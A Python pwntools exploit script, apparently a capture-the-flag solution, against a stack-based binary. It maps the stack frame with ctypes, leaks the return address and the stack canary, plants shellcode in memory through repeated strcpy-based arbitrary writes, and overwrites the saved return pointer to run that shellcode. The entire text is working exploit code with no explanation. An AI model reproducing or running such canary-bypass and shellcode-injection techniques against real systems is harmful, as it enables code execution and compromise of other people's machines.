#!/bin/python

import IPython
from pwn import *
from ctypes import *
from argparse import *


class Stack_Vars(Structure):
    _pack_ = 1
    _fields_ = [("user_in",     c_uint32),
                ("__pad1__",    c_uint64),
                ("buzz_ptr",    c_uint64),

                ("__pad2__",    c_uint32),
                ("iter_idx",    c_uint32),

                ("ans_ptr",     c_uint64),
                ("ans_out",     c_uint64),
                ("__pad3__",    c_uint64),

                ("canary",      c_uint64),
                ("saved_rbp",   c_uint64),
                ("ret_rip",     c_uint64),

                ("sc_rip",      c_uint64 * 16),
                ]


def get_quad_word(proc: process, count: int, payload: bytes):
    proc.clean()
    proc.send(payload[:count])
    proc.recvuntil(b'You entered: ')
    proc.recv(count)

    return proc.recvline()[:-1].ljust(8, b'\x00')[:8]


def get_stack_offset(attr: str):
    return getattr(Stack_Vars, attr, -1).offset


def set_stack_attr(proc: process, obj: Stack_Vars, attr: str):
    val = u64(get_quad_word(proc, get_stack_offset(attr), bytes(obj)))
    setattr(obj, attr, val)


def set_via_strcpy(proc: process, payload: Stack_Vars, 
                   buzz_addr: int, addr:int, val: int):
    print(f"Setting value at {hex(addr)} to {hex(val)}") 
    payload.ans_out = addr
    payload.ans_ptr = buzz_addr
    payload.buzz_ptr = val

    get_quad_word(proc, get_stack_offset('ans_out')+8, bytes(payload))


def leak_stack(proc: process, payload: Stack_Vars, buzz_addr: int, offset: int):
    # rip addr + 1
    payload.ans_ptr = buzz_addr
    payload.ans_ptr += offset - get_stack_offset('buzz_ptr') 
    payload.ans_out = payload.ans_ptr 
    print(f'ans_ptr for addr: {hex(payload.ans_ptr)}')

    proc.clean(0)
    proc.send(bytes(payload)[:get_stack_offset('ans_out')+8])
    proc.recvuntil(b'Correct answer: ')

    rip = b''
    for i in range(0, 8):
        rip += proc.recv(1)
        if rip[i] == ord('\n'):
            rip = rip[:-1]
            break

    return rip.ljust(8, b'\x00')


def get_payload(args: Namespace, proc: process):
    while True:
        payload = Stack_Vars()
        memset(addressof(payload), 0x22, sizeof(payload))
        payload.__pad3__  = -3

        for _ in range(5):
            get_quad_word(proc, 1, b'A')

        payload.iter_idx = -11
        set_stack_attr(proc, payload, 'ans_ptr')
        buzz_addr   = payload.ans_ptr - 4
        userin_addr = buzz_addr - 8 - 4
        print(f"userin addr: {hex(userin_addr)}")


#        can't leak like that because of NULL bytes of addrs we set so we dont SEG
#        payload.ans_ptr = payload.ans_out = buzz_addr + get_stack_offset('sc_rip')
#        canary = get_quad_word(proc, get_stack_offset('canary')+1, bytes(payload))
#        print(f"canary: {canary}")        
    

        leaked_rip  = u64(leak_stack(proc, payload, buzz_addr,\
                                     get_stack_offset('ret_rip'))) 
        payload.ret_rip = (leaked_rip // 16 ** 4) * (16 ** 4) + 0x1269
        print(f"rip: {hex(leaked_rip)}")


        leaked_canary  = (u64(leak_stack(proc, payload, buzz_addr,\
                                         get_stack_offset('canary')+1)) << 8) 
        leaked_canary &= 2 ** 64 - 1
        payload.canary = leaked_canary
        print(f"canary: {hex(leaked_canary)}")


#       sc_rip_offset = get_stack_offset('sc_rip')
#       cyclic_stream = cyclic(sizeof(payload.sc_rip))
#       for i in range(0, sizeof(payload.sc_rip), 8):
#           set_via_strcpy(proc, payload, buzz_addr, sc_rip_offset+i, 
#                          u64(cyclic_stream[i:i+8]))

        print("\n")

        payload.sc_rip[0] = userin_addr + get_stack_offset('sc_rip') + 8 * 6
        for i in range(0, len(args.shellcode_asm), 8):
            set_via_strcpy(proc, payload, buzz_addr, payload.sc_rip[0]+i, 
                           u64(args.shellcode_asm[i:i+8].ljust(8, b'\x90')))


        payload.buzz_ptr = 0
        payload.ans_out = payload.ans_ptr = buzz_addr 
        payload.saved_rbp = buzz_addr - 0x42
        payload.iter_idx = 15

        return cyclic(4) + args.shellcode_asm + \
               bytes(payload)[len(args.shellcode_asm)+4:]


def send_in_payload(payload: bytes, proc: process):
    proc.sendline(payload)
    proc.clean()


